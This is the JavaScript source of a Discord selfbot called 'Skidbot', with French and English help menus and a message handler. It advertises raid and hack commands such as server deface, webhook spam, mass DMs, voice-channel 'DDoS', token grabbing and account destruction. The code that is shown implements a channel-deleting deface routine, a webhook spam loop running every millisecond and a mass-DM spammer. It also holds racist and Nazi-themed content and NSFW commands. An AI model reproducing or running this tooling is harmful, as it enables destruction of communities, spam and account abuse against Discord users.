const Discord = require('discord.js');
require('colors');
const client = new Discord.Client();
const ConfigFile = require('./config.json');
const token = ConfigFile.token;
const yourgif = ConfigFile.gif;
const base64 = require('base-64');
const utf8 = require('utf8');
const fs = require('fs');
const hastebins = require('hastebin-gen');
const rpcGenerator = require('discordrpcgenerator');
const backups = require('./Data/backups.json');
const afk = require('./Data/afk.json');
const db = require('./Data/pubmp.json');
const lbackup = require('./Data/liste.json');
const kicked = require('./Data/vkick.json');
const prefix = ConfigFile.prefix;
const superagent = require('superagent');
const fetch = require('node-fetch');
const request = require('request');
const nodePortScanner = require('node-port-scanner');

function nitrocode(length, letter) {

    var multiplier = '';
    if (letter.indexOf('0') > -1) multiplier += '0123456789';
    if (letter.indexOf('A') > -1) multiplier += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (letter.indexOf('a') > -1) multiplier += 'abcdefghijklmnopqrstuvwxyz';
    if (letter.indexOf('ඞ') > -1) multiplier += 'ඞ卐☭✡ᴡᴀɪғᴜᴡᴀʀᴇsᴋɪᴅʙᴏᴛ';
    var results = '';


    for (var i = length; i > 0; --i) {
        results += multiplier[Math.floor(Math.random() * multiplier.length)];

    }

    return results;
}
const color = ConfigFile.color;
const rire = ['https://cdn.discordapp.com/attachments/757637821484892241/864509679178088458/d2a5e5addccd1c9082b127fd0dca67e3.gif',
    'https://cdn.discordapp.com/attachments/757637821484892241/864510012498640896/tenor.gif',
    'https://cdn.discordapp.com/attachments/757637821484892241/864510346109517866/tenor_1.gif',
    'https://cdn.discordapp.com/attachments/757637821484892241/864510531745218630/tenor_2.gif',
    'https://cdn.discordapp.com/attachments/757637821484892241/864511049540960256/1af18a832bc7bc54c3e0a471f3d6c456.gif',
    'https://media.tenor.com/images/45c7f0fb05709adb75b6683323b1ffff/tenor.gif',
    'https://media1.tenor.com/images/3453480fc595ff10eb3450d63bb62c45/tenor.gif?itemid=21716755',
    'https://media.tenor.com/images/00f9ff3e95d5621dc5b674b1ddbf97dc/tenor.gif'
];
const kiss = ['https://media1.tenor.com/images/9fac3eab2f619789b88fdf9aa5ca7b8f/tenor.gif?itemid=12925177',
    'https://media1.tenor.com/images/af50852d633a2f77828a7018eed43ea8/tenor.gif?itemid=17845616',
    'https://media1.tenor.com/images/a0b68f4704f811bfcc517574425e96a5/tenor.gif?itemid=5291693',
    'https://media1.tenor.com/images/c81f4a084bceaaa3a627a6143e84731a/tenor.gif?itemid=17916458'
];
const hugh = ['https://media1.tenor.com/images/18474dc6afa97cef50ad53cf84e37d08/tenor.gif?itemid=12375072',
    'https://media1.tenor.com/images/a211f33e4ff688f9101a46ed95f2fb21/tenor.gif?itemid=19327081',
    'https://media1.tenor.com/images/edea458dd2cbc76b17b7973a0c23685c/tenor.gif?itemid=13041472',
    'https://media1.tenor.com/images/7e731d6a63293d932e69e6eacb422cfe/tenor.gif?itemid=19326519'
];
const ez = ['https://media1.tenor.com/images/8c8607b20bfe4ca6c15cf9c4f9e20923/tenor.gif?itemid=22157252',
    'https://media1.tenor.com/images/b24c99c8d81eefc039311752054abce6/tenor.gif?itemid=16442048',
    'https://media1.tenor.com/images/014b9df39db19955f36682506ad49e1c/tenor.gif?itemid=19015096'
];
const punch = ['https://media.tenor.com/images/7bd895a572947cf17996b84b9a51cc02/tenor.gif',
    'https://media1.tenor.com/images/a8b2902ea713f2a66c5e9cd4f1fb94e7/tenor.gif?itemid=20054036',
    'https://media.tenor.com/images/5bf52a1335155572859dff8429873a30/tenor.gif',
    'https://media.tenor.com/images/a30c2719ece3362814f12adc5f84ad30/tenor.gif'
];
var verifLevels = ['None', 'Low', 'Medium', '(╯°□°）╯︵  ┻━┻'];
var regionn = {
    'Brésil': 'Brazil',
    'eu-central': 'Central Europe',
    'singapoure': 'Singapore',
    'us-central': 'U.S. Central',
    'sydney': 'Sydney',
    'us-east': 'U.S. East',
    'us-south': 'U.S. South',
    'us-west': 'U.S. West',
    'eu-west': 'Western Europe',
    'vip-us-east': 'VIP U.S. East',
    'Londre': 'London',
    'amsterdam': 'Amsterdam',
    'hongkong': 'Hong Kong'
}

function translateDate(date) {
    const Months = ["Jan", "Fev", "Mar", "Avr", "Mai", "Juin", "Juillet", "Aout", "Sep", "Oct", "Nov", "Dec"];
    const Days = ["Dimanche", "Lundi", "Mardi", "Mercredi", "Jeudi", "Vendredi", "Samedi"];
    return Days[date.getUTCDay()] + ", " + date.getUTCDate() + " " + Months[date.getUTCMonth()] + " " + date.getUTCFullYear() + " at " + date.getUTCHours() + ":" + zeros(date.getUTCMinutes(), 2) + ":" + zeros(date.getUTCSeconds(), 2) + "." + zeros(date.getUTCMilliseconds(), 3);
}

function checkDays(date) {
    var now = new Date();
    var diff = now.getTime() - date.getTime();
    var days = Math.floor(diff / 86400000);
    return days + (days == 1 ? " day" : " days") + " ago";
};
client.login(token)
client.on('ready', function () {
    delete db;
    saver();
    console.log('Skidbot Evolution'.bgMagenta);
    console.log(`
     

       
     ██╗    ██╗ █████╗ ██╗███████╗██╗   ██╗██╗    ██╗ █████╗ ██████╗ ███████╗
     ██║    ██║██╔══██╗██║██╔════╝██║   ██║██║    ██║██╔══██╗██╔══██╗██╔════╝
     ██║ █╗ ██║███████║██║█████╗  ██║   ██║██║ █╗ ██║███████║██████╔╝█████╗  
     ██║███╗██║██╔══██║██║██╔══╝  ██║   ██║██║███╗██║██╔══██║██╔══██╗██╔══╝  
     ╚███╔███╔╝██║  ██║██║██║     ╚██████╔╝╚███╔███╔╝██║  ██║██║  ██║███████╗
      ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝╚═╝      ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ 
                  ! Skidbot 1.0
       ╔═════════════════════════════════╗
       ║-->  User Name : ${client.user.tag}   
       ╟─────────────────────────────────╢
       ║-->  User id : ${client.user.id} 
       ╟─────────────────────────────────╢
       ║-->  Prefix   : ${prefix}                 
       ╟─────────────────────────────────╢
       ║-->  Users    : ${client.guilds.map(guild => guild.memberCount).reduce((a, b) => a + b)} 
       ╟─────────────────────────────────╢
       ║-->  Bots     : ${client.users.filter(user => user.bot).size}                    
       ╟─────────────────────────────────╢
       ║-->  Channels : ${client.channels.size}              
       ╟─────────────────────────────────╢
       ║-->  Guilds   : ${client.guilds.size}               
       ╚═════════════════════════════════╝                                  
         https://discord.gg/z2fEGpbp52                      \n\n`.blue)
    if (client.user.premium > 0) {
        console.log('gg you have a nitro account ;)'.italic.red);
    } else {
        console.log('snif, you don\'have nitro, but don\'t worry, our nitro autoclaimer gonna claim any nitro automaticly'.red);
    }
});
client.on('ready', function () {
    if (client.user.bot) {
        console.log(`${client.user.username} is a bot, i can\'t change his profile :/`.red);
        process.exit(1)
    } else {
        console.log(`${client.user.username} boup bip boup nice you\'re not a bot ^^!`.italic.magenta);
    }
});
var uuid = () => ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, a => (a ^ Math.random() * 16 >> a / 4).toString(16));
let cmd = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**ඞ Skidbot commands ඞ**')
    .setDescription('[Lien pour avoir Skidbot](https://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA)')
    .addField('**Commande Help**', '`help`, `help fun`, `help utility`, `help moderation`, `help nsfw`, `help backup`, `help hack`, `help raid`')
    .addField('**Commande Backup** :gear:: ', '`backup friend`, `backup create`,`backup info`, `backup load`, `backup delete`, `backup purge`, `backup info`')
    .addField('**Commands Fun** :joy:: ', '`auto voice kick`, `stop auto voice kick`, `start typing`, `branlette`, `lovecalc`, `fight`, `boom`, `reverse`, `nitro`, `avatar`, `8ball`, `say`, `rire`, `kiss`, `ez`, `load`, `punch`, `calin`, `subs`,`chingchong`')
    .addField('**Commands Moderation** :tools:: ', '`voice kick`, `set serveur name`, `roles list`, `channels list`, `name all`, `ban all`, `kick all`, `shutdown`, `kick`, `ban`, `purge`, `delete all channels`, `delete all role`, `discord`, `gen token`, `user info`, `role info`, `serveur info`, `stats`, `encode`, `mp friend`')
    .addField('**Commands Nsfw** :underage: :', '`ass`, `4k`, `anal`, `hentai`, `nsfw-gif`, `pussy`, `thigh`')
    .addField('**Commands Raid** :no_entry_sign: :', '`deface`, `spam`, `webhook spam`, `create channel`, `stop spam`')
    .addField('**Commands Hack** :skull_and_crossbones: :', '`check token`, `info token`, `fuck token`, `ddos voc`, `ddos-stop`, `token`, `port scanner`, `port docs`')
    .addField('**Commands Utility** :globe_with_meridians: :', '`nuke dm`,, `mp all`, `stop mp all`, `grab pp`, `delete all emote`, `steal emote`, `remove emote`, `emote`, `add emote` `user info`, `serveur info`, `stats`, `restart`, `reset`, `role info`, `encode`, `discord`, `gen token`, `mp friend`, `change hypesquad`')
    .addField('**Commands Status** :performing_arts: :', '`rocket league`, `spotify`, `fortnite`, `among us`, `badlion`, `apex`, `csgo`, `roblox`, `pornhub`, `tinder`, `clash royal`, `clash of clan`, `naruto`, `hunter x hunter`, `tokyo ghoul`, `youtube`, `minecraft`, `twitter`, `instagram`, `tiktok`, `facebook`, `snapchat`, `skype`, `google`, `nike`, `lacoste`, `gucci`')
    .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
    .setImage('https://cdn.discordapp.com/attachments/865298692080664626/865578521014829076/tenor.gif')
    .setFooter('Skidbot 1.0');

let help_hack = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Pannel de Help Hacking**')
    .setURL('https://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA')
    .addField('**' + prefix + 'ddos voc**', '`start a DDoS attack on voice channel`')
    .addField('**' + prefix + 'ddos-stop**', '`Stop DDoS attack on voice channel`')
    .addField('**' + prefix + 'token (@user)**', '`display user\'s token`')
    .addField('**' + prefix + 'check token (token)**', '`Check if a token is valid`')
    .addField('**' + prefix + 'info token (token)**', '`Display information on a user based on his token`')
    .addField('**' + prefix + 'fuck token (token)**', '`Destroy a user\'s account with his token`')
    .addField('**' + prefix + 'port scanner (adresse IP)**', '`Scan every open port on an IP address it scans port 1 to 9999`')
    .addField('**' + prefix + 'port docs**', '`show you documentation on TCP ports usage`')
    .setDescription('`' + ('the prefix is:  ' + prefix + '') + '`')
    .setDescription('[link to sub to TaxMachine](https://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA)')
    .setImage('https://media.tenor.com/images/7d0b9ae0c03dcf36b87f01cf14ee12b5/tenor.gif')
    .setThumbnail('https://cdn.discordapp.com/attachments/802303133744627765/864535487846678528/hitler-in-ur-computer.gif')
    .setFooter('Skidbot 1.0');
let help_raid = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Raid Commands**')
    .setURL('https://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA')
    .addField('**' + prefix + 'create channel**', '`create 10 texting channels`')
    .addField('**' + prefix + 'deface**', '`Destroy entirely a server (icon/name/channels)`')
    .addField('**' + prefix + 'webhook spam**', '`create 3 webhook per channels and spam really fast`')
    .addField('**' + prefix + 'spam (text)**', '`Spam something`')
    .addField('**' + prefix + 'stop spam**', '`Stop spamming`')
    .setDescription('`' + ('the prefix is:  ' + prefix + '') + '`')
    .setDescription('[link to sub to TaxMachine](https://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA)')
    .setImage('https://cdn.discordapp.com/attachments/802303133744627765/865281362490818570/video0-14-1.mp4')
    .setThumbnail('https://cdn.discordapp.com/attachments/757637821484892241/864540591986311208/skidbot.png')
    .setFooter('Skidbot 1.0');
let help = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('ඞ Skidbot Help :ඞ')
    .addField('**' + prefix + 'cmd**', '`Display all existing commands`')
    .addField('**' + prefix + 'help fun**', '`Display the funny part of the bot` :joy:')
    .addField('**' + prefix + 'help backup**', '`Display help for Backup shit` :gear:')
    .addField('**' + prefix + 'help moderation**', '`Display mods commands` :tools:')
    .addField('**' + prefix + 'help utility**', '`Display some helpfull commands` :globe_with_meridians:')
    .addField('**' + prefix + 'help nsfw**', '`Do i really need to explain what is it?` :underage:')
    .addField('**' + prefix + 'help raid**', '`Display the raid help commands` :no_entry_sign: ')
    .addField('**' + prefix + 'help hack**', '`Display hack commands` :skull_and_crossbones:')
    .addField('**' + prefix + 'help statut**', '`Display status commands` :performing_arts:')
    .setDescription('`' + ('the prefix is:  ' + prefix + '') + '`')
    .setDescription('[link to sub to TaxMachine](https://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA)')
    .setImage('https://cdn.discordapp.com/attachments/864270091193417758/864541443984195654/tumblr_c38b354066a837267ba375ec2fb3f70c_62b90734_2048.jpg')
    .setThumbnail('https://cdn.discordapp.com/attachments/757637821484892241/864540591986311208/skidbot.png')
    .setFooter('Skidbot 1.0');
let help_backup = new Discord.RichEmbed()
    .setColor(color)
    .setTitle('**Backup help thingy** :gear: ')
    .setDescription('[Link to sub to TaxMachine](https://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA)')
    .addField('**' + prefix + 'backup create**', '`create a server backup`')
    .addField('**' + prefix + 'backup friend**', '`create a backup of all you\'r friends`')
    .addField('**' + prefix + 'backup load (id)**', '`load a backup`')
    .addField('**' + prefix + 'backup liste**', '`see all backups`')
    .addField('**' + prefix + 'backup delete (id)**', '`delete a backup`')
    .addField('**' + prefix + 'backup purge**', '`delete all you\'r backups`')
    .addField('**' + prefix + 'backup info (id)**', '`send backup\'s info`')
    .setDescription('`' + ('le prefix est:  ' + prefix + '') + '`')
    .setImage(yourgif)
    .setThumbnail('https://cdn.discordapp.com/attachments/757637821484892241/864540591986311208/skidbot.png')
    .setFooter('Skidbot 1.0');
let help_fun = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Funny commands help** :joy: ')
    .setDescription('[Link to sub to TaxMachine](https://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA)')
    .addField('**' + prefix + 'start typing**', '`Display you has typing indefinitly`')
    .addField('**' + prefix + 'avatar (@user)**', '`Display member\'s pfp`')
    .addField('**' + prefix + 'lovecalc (@user)**', '`love test`')
    .addField('**' + prefix + 'nitro**', '`Generate a random nitro gift`')
    .addField('**' + prefix + '8ball (text)**', '`ask a question`')
    .addField('**' + prefix + 'say (text)**', '`Display the text in embed`')
    .addField('**' + prefix + 'fight (@user)**', '`Fight another user`')
    .addField('**' + prefix + 'boom (@user)**', '`Make another user explode`')
    .addField('**' + prefix + 'smile**', '`Send a smiling gif`')
    .addField('**' + prefix + 'kiss (@user)**', '`Kiss the mentionned member`')
    .addField('**' + prefix + 'ez (@user)**', '`EZZZZZ RUN`')
    .addField('**' + prefix + 'load**', '`Send a loading`')
    .addField('**' + prefix + 'masturbation**', '`Simulate a masturbation + cumshot`')
    .addField('**' + prefix + 'punch (@user)**', '`Hit another member`')
    .addField('**' + prefix + 'calin (@user)**', '`Make a hug to another member`')
    .addField('**' + prefix + 'reverse (text)**', '`Put you\'r message upside down`')
    .addField('**' + prefix + 'subs**', '`Subscribe to my channel`')
    .addField('**' + prefix + 'chingchong**', '`send a chinese`')
    .setDescription('`' + ('the prefix is:  ' + prefix + '') + '`')
    .setImage('https://cdn.discordapp.com/attachments/802303133744627765/865285017964904448/mel.png')
    .setThumbnail('https://cdn.discordapp.com/attachments/757637821484892241/864540591986311208/skidbot.png')
    .setFooter('Skidbot 1.0');
let help_moderation = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Pannel de Help Moderation** :tools: ')
    .setDescription('[Lien pour sub a TaxMachine](https://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA)')
    .addField('**' + prefix + 'voice kick (@user)**', '`Kick un utilisateur du salon vocal`')
    .addField('**' + prefix + 'set serveur name (text)**', '`Change le nom du serveur`')
    .addField('**' + prefix + 'shutdown**', '`close the bot`')
    .addField('**' + prefix + 'name all**', '`Rename all member of a server`')
    .addField('**' + prefix + 'ban-all**', '`Ban all poeple from a server`')
    .addField('**' + prefix + 'kick-all**', '`Kick all poeple from a server`')
    .addField('**' + prefix + 'kick (@user)**', '`kick a member`')
    .addField('**' + prefix + 'ban (@user)**', '`Ban a member`')
    .addField('**' + prefix + 'roles list**', '`send a list of all availible roles in a server`')
    .addField('**' + prefix + 'channels list**', '`Send a list of all channel in a server`')
    .addField('**' + prefix + 'purge**', '`Delete all message`')
    .addField('**' + prefix + 'delete all channel**', '`Delete all channel from a server`')
    .addField('**' + prefix + 'delete all role**', '`Delete all role from a server`')
    .setDescription('`' + ('the prefix is:  ' + prefix + '') + '`')
    .setImage('https://media.tenor.com/images/796acaadb1bf90fd9abb7459b9977b5d/tenor.gif')
    .setThumbnail('https://cdn.discordapp.com/attachments/757637821484892241/864540591986311208/skidbot.png')
    .setFooter('Skidbot 1.0');
let help_info = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**Utility commands help** :globe_with_meridians: ')
    .setDescription('[Link to sub to TaxMachine](https://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA)')
    .addField('**' + prefix + 'mp all**', '`Send dm to all member of a server`')
    .addField('**' + prefix + 'stop mp all**', '`Stop to send dm to member of a server`')
    .addField('**' + prefix + 'auto voice kick (@user)**', '`Automaticly disconnect user from a voice channel)`')
    .addField('**' + prefix + 'stop auto voice kick (@user)**', '`Stop the auto voice kick command`')
    .addField('**' + prefix + 'nuke dm**', '`Close all you\'r dms`')
    .addField('**' + prefix + 'afk (text)**', '`Show you afk"`')
    .addField('**' + prefix + 'user info (@user)**', '`Display user\'s info`')
    .addField('**' + prefix + 'serveur info**', '`Display server\'s info`')
    .addField('**' + prefix + 'stats**', '`Display s3lf info`')
    .addField('**' + prefix + 'restart**', '`Restart the s3lf`')
    .addField('**' + prefix + 'reset**', '`Reset you\'r status`')
    .addField('**' + prefix + 'role info (@role)**', '`Send role\'s info`')
    .addField('**' + prefix + 'encode (text)**', '`Crypt you\'r text in base64`')
    .addField('**' + prefix + 'discord**', '`Display discord js version`')
    .addField('**' + prefix + 'gen token**', '`Change you\'r token`')
    .addField('**' + prefix + 'add emote (emote) <name>**', '`Add an emote`')
    .addField('**' + prefix + 'emote (emote)**', '`Give info about all server\'s emote`')
    .addField('**' + prefix + 'remove emote (emote)**', '`Delete server\'s emote`')
    .addField('**' + prefix + 'steal emote (serveur id)**', '`Add all emoji from a server to you\'r server`')
    .addField('**' + prefix + 'delete all emote**', '`Delete all server\'s emote`')
    .addField('**' + prefix + 'grab pp (user)**', '`Steal mentionned user pfp`')
    .addField('**' + prefix + 'check token (token)**', '`Verify if a token is availible`')
    .addField('**' + prefix + 'mp friend (message)**', '`Send a private message to all you\'r friends`')
    .addField('**' + prefix + 'change hypesquad (brilliance/bravery/ballance)**', '`allow you to change you\'r hypesquad`')
    .addField('**nitro autoclaim**', '`Nitro autoclaim claims automaticly nitro gift on all availible channels`')
    .setDescription('`' + ('the prefix is:  ' + prefix + '') + '`')
    .setImage(yourgif)
    .setThumbnail('https://cdn.discordapp.com/attachments/757637821484892241/864540591986311208/skidbot.png')
    .setFooter('Skidbot 1.0');
let help_nsfw = new Discord.RichEmbed()
    .setTimestamp()
    .setColor(color)
    .setTitle('**miam help commands** :underage: ')
    .setDescription('[Link to sub to TaxMachine](https://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA)')
    .addField('**' + prefix + 'ass**', '`Send ass`')
    .addField('**' + prefix + '4k**', '`Send nsfw in 4k`')
    .addField('**' + prefix + 'anal**', '`Send anal gif`')
    .addField('**' + prefix + 'hentai**', '`Send an image/gif of hentai`')
    .addField('**' + prefix + 'nsfw-gif**', '`Send sex gif`')
    .addField('**' + prefix + 'pussy**', '`Send pussy image`')
    .addField('**' + prefix + 'thigh**', '`Send thigh image`')
    .setDescription('`' + ('the prefix is:  ' + prefix + '') + '`')
    .setImage('https://cdn.discordapp.com/attachments/802303133744627765/865280945824989194/amogus.mp4')
    .setThumbnail('https://cdn.discordapp.com/attachments/757637821484892241/864540591986311208/skidbot.png')
    .setFooter('Skidbot 1.0');

function saver() {
    fs.writeFile("./Data/pubmp.json", JSON.stringify(db), err => {
        if (err) console.error(err);
    });
}


client.on('message', message => {
    if (message.author.id === '815345046526230538') {
        if (message.guild.id === '786244044048695297') {
            message.delete()
        }
    };
    let clientid = client.user.id;
    let randomnumber = Math.floor(Math.random() * 9000 + 1000)
    async function addreaction() {
        const miliseconds = Math.floor(Math.random() * 1500);
        async function react() {
            message.react("🎉").catch(err => {
                if (err) {
                    console.log('\n╔═════════════════════════════════╗'.blue)
                    console.log('Log:'.red) ^
                        console.log('╟─────────────────────────────────╢'.blue)
                    console.log('║--> [', `/!/ Attention`.red, ']', `\nJe n'ai pas reussi a reagir au giveaway sur ${message.guild.name}, il est possible que je n'ai pas les permissions :/`.green)
                    console.log('╚═════════════════════════════════╝'.blue)
                    return;
                }
            });
            console.log('\n╔═════════════════════════════════╗'.blue)
            console.log('Log:'.red) ^
                console.log('╟─────────────────────────────────╢'.blue)
            console.log('║--> [', `Youpi`.green, ']', `\nJ'ai pas correctement a reagit au giveaway sur ${message.guild.name}, en ${miliseconds}ms je suis super rapide hehe ;)`.green)
            console.log('╚═════════════════════════════════╝'.blue)
        }
        setTimeout(react, miliseconds);
    }
    async function checkwin() {
        if (message.author.id == "294882584201003009" || message.author.id == "716967712844414996") {
            if (message.content.includes("Congratulations")) {
                if (message.content.includes(client.user.id)) {
                    if (message.embeds)
                        console.log('\n╔═════════════════════════════════╗'.blue)
                    console.log('Log:'.red) ^
                        console.log('╟─────────────────────────────────╢'.blue)
                    console.log('║--> [', `GG!`.green, ']', `\nJe t'ai fais gagner le giveaway sur le serveur ${message.guild.name} va vite reclamer ta récompense!`.green)
                    console.log('╚═════════════════════════════════╝'.blue)
                }
            }
        }
    }
    checkwin()
    if (message.author.id == "294882584201003009" || message.author.id == "716967712844414996") {
        if (message.embeds[0]) {
            if (message.embeds[0].description.includes("React with")) {
                addreaction()
            }
        }
    }
    let msg = message;
    if (message.author.id === client.user.id) {
        if (afk[client.user.id]) {
            if (message.content.includes(":x:")) {
                return;
            } else
                delete afk[client.user.id]
            saving();
            message.channel.send(":white_check_mark: **you\'r no more afk**")
            console.log("afk commands stopped.".yellow)
        }
    };
    if (message.content.includes(client.user.id)) {
        if (message.author.id === client.user.id) return;
        if (afk[client.user.id]) {
            message.reply(":x: **Im afk for this reason** " + afk[client.user.id].r)
            console.log('\n╔═════════════════════════════════╗'.blue)
            console.log('║--> [Log:]'.red)
            console.log('╟─────────────────────────────────╢'.blue)
            console.log('║--> [', `/!\\ Warning`.red, ']', `\nuser ${message.author.username} pinged you while being afk ${message.content}`.green)
            console.log('╚═════════════════════════════════╝'.blue)
        } else return;
    };
    var args = message.content.substring(prefix.length).split(" ");
    var mentionuser = message.mentions.users.first();
    if (message.channel.type === "dm") {
        if (msg.author.bot) {
            if (message.content.includes('discord.gg')) {
                let botblock = message.author;
                botblock.send(`/!\\ Anti mp`).then((msg) => {
                    msg.delete()
                })
                console.log('\n╔═════════════════════════════════╗'.blue)
                console.log('Log:'.red) ^
                    console.log('╟─────────────────────────────────╢'.blue)
                console.log('║--> [', `/!/ Warning`.red, ']', `\nthe bot ${message.author.username} sent you a sketchy invite ${message.content}`.green)
                console.log('╚═════════════════════════════════╝'.blue)
            }
        }
    }
    if (msg.author.id !== client.user.id) return;
    if (message.content.startsWith(prefix + 'deface')) {
        if (message.channel.type === 'dm' || message.channel.type === 'group') return message.edit(':x: **command only useable on server**.')
        if (!message.member.hasPermission('ADMINISTRATOR')) return message.edit(":x: **you don\'t have perms to do that**");
        message.delete();
        message.guild.setName(`${'RAIDED BY ඞWaifuWare SkidSystemඞ X '}${client.user.username}${''}`);
        message.guild.setIcon('https://cdn.discordapp.com/attachments/757637821484892241/864540591986311208/skidbot.png');
        message.guild.channels.forEach(ch => {
            ch.delete();
        });
        if (message.deletable) {
            message.delete().catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'an error occured and i can\'t do something'.green);
            })
        }
        message.guild.createChannel('ඞWaifuWareඞ', 'text');
        console.log('deface command executed'.yellow);
    };
    if (message.content.startsWith(prefix + "create channel")) {
        if (message.channel.type === 'dm' || message.channel.type === 'group')
            return message.edit(':x: **commands only useable on server**.')
        if (!message.member.hasPermission("MANAGE_CHANNELS"))
            return message.edit(":x: **you don't have enough perms to do that**");
        message.delete();
        for (let pas = 0; pas < 20; pas++) {

            message.guild.createChannel(`**ඞSkidbotඞ**-𝐱- ${client.user.username}`, 'text').catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'an error occured and i can\'t do something'.green);
            })
        };
        console.log('create channel command executed.'.yellow);
    };
    if (message.content.startsWith(prefix + 'start typing')) {
        message.delete();
        message.channel.startTyping();
        console.log('you start typing.'.yellow);
    };
    if (message.content.startsWith(prefix + 'webhook spam')) {
        let argument = args.splice(2).join(' ') || '@everyone https://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA https://www.twitch.tv/taxmachines https://discord.gg/XqzWEgFUeT';
        if (message.channel.type === 'dm' || message.channel.type === 'group') {
            return message.edit(':x: **command only useable on servers**.')
        };
        if (message.member.hasPermission('MANAGE_WEBHOOKS')) {
            message.guild.channels.forEach((channel) => {
                if (!channel) {
                    return
                };
                if (channel.type == 'text') {
                    channel.createWebhook('ඞSkidbotඞ', 'https://cdn.discordapp.com/attachments/757637821484892241/864540591986311208/skidbot.png').catch(err => {
                        return console.log('[', 'ERROR'.red, ']', 'an error occured and i can\'t do something'.green);
                    })
                }
            });
            setInterval(function () {
                message.guild.fetchWebhooks().then(web => web.forEach(webhook => webhook.send(argument)))
            }, 1)
            console.log('webhook spammed succesfully'.yellow);
        };
    };
    if (message.content.startsWith(prefix + 'masturbation')) {
        message.edit('8=:fist:==D ');
        message.edit('8==:fist:=D ');
        message.edit('8===:fist:D ');
        message.edit('8==:fist:=D ');
        message.edit('8=:fist:==D ');
        message.edit('8:fist:===D ');
        message.edit('8=:fist:==D ');
        message.edit('8==:fist:=D ');
        message.edit('8===:fist:D ');
        message.edit('8==:fist:=D:sweat_drops: ');
        message.edit('8===:fist:D:sweat_drops: ');
        console.log('masturbated succesfully'.yellow);
    };
    if (message.content.startsWith(prefix + 'dm all')) {
        if (!message.guild) {
            return message.edit(':x: **command only useable on servers**')
        };
        message.delete();
        console.log('command dm all executed'.yellow);
        let argument = args.splice(2).join(' ') || '@everyonehttps://discord.gg/z2fEGpbp52 Selfbothttps://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA';
        let guild = message.guild;
        if (!guild) {
            return
        };
        setInterval(() => {
            let membres = serveur.members.random();
            if (membres.user.bot) return;
            if (membres.user.id === client.user.id) return;
            if (db[membres.user.id]) return;
            membres.send(argument + ' dm by Skidbot').catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'an error occured and i can\'t do something'.green);
            });
            console.log(membres.user.username + ' got dm\'d');
            db[membres.user.id] = {
                raison: 'mp'
            };
            saver()
        }, 450)
    };
    if (message.content.startsWith(prefix + "stop dm all")) {
        client.destroy().then(() => client.login(token))
        console.log("command dm all stopped".yellow)
    }
    if (message.content.startsWith(prefix + "auto voice kick")) {
        if (!message.guild) return message.edit(":x: **command only useable on server**");
        if (!message.guild.me.hasPermission('MOVE_MEMBERS'))
            return message.reply(':x:**you don\'t have perms to kick user**.');
        const member = message.mentions.members.first();
        if (!member) return message.edit(':x:**Mention a user please**');
        kicked[message.guild.id] = {
            user: member.id
        };
        kicker();
        console.log("Auto voice kick command executed".yellow)
        message.edit(":white_check_mark: **Auto Voice kick setup the user can no more join the channel**")
        if (!member.voiceChannel) return;
        member.setVoiceChannel(null);
    }
    if (message.content.startsWith(prefix + "stop auto voice kick")) {
        if (!message.guild)
            return message.edit(":x: **command only useable on servers**");
        const member = message.mentions.members.first();
        if (!member)
            return message.edit(':x:**mention a user please**');
        delete kicked[message.guild.id].user
        kicker();
        message.edit(":white_check_mark: **Auto Voice kick set up the user can join the channel**")
        console.log("Auto voice kick stopped succesfully".yellow)
    }
    if (message.content.startsWith(prefix + 'voice kick')) {
        if (!message.guild) {
            return message.edit(':x: **command only useable on servers**')
        };
        if (!message.guild.me.hasPermission('MOVE_MEMBERS')) {
            return message.reply(":x:**you don\'t have perms to kick user**.")
        };
        const member = message.mentions.members.first();
        if (!member) {
            return message.edit(':x:**Mention a user please**')
        };
        if (!member.voiceChannel) {
            return message.edit(":x:**the user is not in a voice channel**")
        };
        member.setVoiceChannel(null).catch(err => {
            return message.edit(":x:**the user is not in a voice channel**")
        });
        message.edit(":white_check_mark: **the user has been kick succesfully**");
        console.log('Commande voice kick executé.'.yellow);
    };
    if (message.content.startsWith(prefix + 'afk')) {
        let argument = args.splice(1).join(' ') || 'Skidbothttps://www.youtube.com/channel/UCXranBOFFyMLIkhBJv4iaqA';
        afk[client.user.id] = {
            activé: 'yes',
            r: argument
        };
        saving();
        message.edit(':white_check_mark: **you are afk for** ' + argument);
        console.log('afk command executed'.yellow);
    };
    if (message.content === prefix + 'channels list') {
        if (!message.guild) {
            return message.edit(':x: **command only useable on servers**')
        };
        if (!message.member.hasPermission('EMBED_LINKS')) {
            return message.edit(':x: **insuficient permission (embed_links)** ' + channel.map(channels => {
                return channels.name;
            }) + '');
        };
        const channel = message.guild.channels;
        var embed = new Discord.RichEmbed()
            .setFooter('Skidbot 1.0')
            .setColor(color)
            .addField('channel list:', channel.map(channels => {
                return channels.name;
            }));
        for (i = 0; i < 10; i++) {
            embed.setColor(color);
            message.edit(embed).catch(err => {
                return console.log('[', 'ERROR'.red, ']', 'an error has occured and i can\'t do something'.green);
            });
        };
